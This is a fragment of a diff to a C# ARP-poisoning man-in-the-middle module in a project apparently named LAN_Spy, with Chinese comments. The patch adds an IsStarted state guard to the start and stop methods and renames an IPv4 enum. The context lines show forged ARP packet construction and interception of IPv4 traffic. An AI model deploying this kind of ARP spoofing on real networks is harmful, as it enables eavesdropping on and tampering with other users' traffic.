@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Net;
 using System.Threading;
+using LAN_Spy.Model.Classes;
 using PacketDotNet;
 using PacketDotNet.Utils;
 using SharpPcap;
@@ -45,13 +46,21 @@ namespace LAN_Spy.Model {
         ///     毒化目标。
         /// </summary>
         public List<Host> Target1 = new List<Host>(), Target2 = new List<Host>();
+        
+        /// <summary>
+        ///     指示模块是否处在工作状态。
+        /// </summary>
+        public bool IsStarted { get; private set; }
 
         /// <summary>
-        ///     根据设定的 <see cref="List{T}" /> 类型的目标列表进行ARP毒化中间人攻击。
+        ///     根据设定的 <see cref="List{T}" /> 类型的目标列表进行ARP毒化中间人攻击，如果模块已在工作状态则不会有效果。
         /// </summary>
         /// <exception cref="InvalidOperationException">已有一项毒化工作正在进行。</exception>
         /// <exception cref="NullReferenceException">未设置默认网关。</exception>
         public void StartPoisoning() {
+            // 判断是否为工作状态
+            if (IsStarted) return;
+
             // 判断是否有未停止的毒化工作
             if (_device != null)
                 throw new InvalidOperationException("已有一项毒化工作正在进行。");
@@ -90,6 +99,9 @@ namespace LAN_Spy.Model {
                 poisonThread.Start(target);
                 _poisonThreads.Add(poisonThread);
             }
+
+            // 进入工作状态
+            IsStarted = true;
         }
 
         /// <summary>
@@ -113,7 +125,7 @@ namespace LAN_Spy.Model {
                 _device.MacAddress,
                 new IPAddress(new byte[] {0, 0, 0, 0})) {
                 HardwareAddressType = LinkLayers.Ethernet,
-                ProtocolAddressType = EthernetPacketType.IpV4
+                ProtocolAddressType = EthernetPacketType.IPv4
             };
             ether.PayloadPacket = arp;
             arp.ParentPacket = ether;
@@ -167,7 +179,7 @@ namespace LAN_Spy.Model {
                         // 由本机发出的数据包，忽略
                         if (ether.SourceHwAddress.ToString().Equals(_device.MacAddress.ToString())) continue;
 
-                        if (ether.Type == EthernetPacketType.IpV4) {
+                        if (ether.Type == EthernetPacketType.IPv4) {
                             // 解析IPv4包
                             var ipv4Packet = (IPv4Packet) ether.PayloadPacket;
 
@@ -222,7 +234,7 @@ namespace LAN_Spy.Model {
                                 _device.MacAddress,
                                 arp.TargetProtocolAddress) {
                                 HardwareAddressType = LinkLayers.Ethernet,
-                                ProtocolAddressType = EthernetPacketType.IpV4
+                                ProtocolAddressType = EthernetPacketType.IPv4
                             };
                             e.PayloadPacket = a;
                             a.ParentPacket = e;
@@ -245,6 +257,9 @@ namespace LAN_Spy.Model {
         /// </summary>
         /// <exception cref="TimeoutException">等待线程结束超时。</exception>
         public void StopPoisoning() {
+            // 判断是否为工作状态
+            if (!IsStarted) return;
+
             // 向毒化线程发送终止信号
             foreach (var poisonThread in _poisonThreads)
                 if (poisonThread.IsAlive)
@@ -292,6 +307,9 @@ namespace LAN_Spy.Model {
             // 清理缓冲区
             _gateway = null;
             ClearCaptures();
+
+            // 退出工作状态
+            IsStarted = false;
         }
 
         /// <summary>
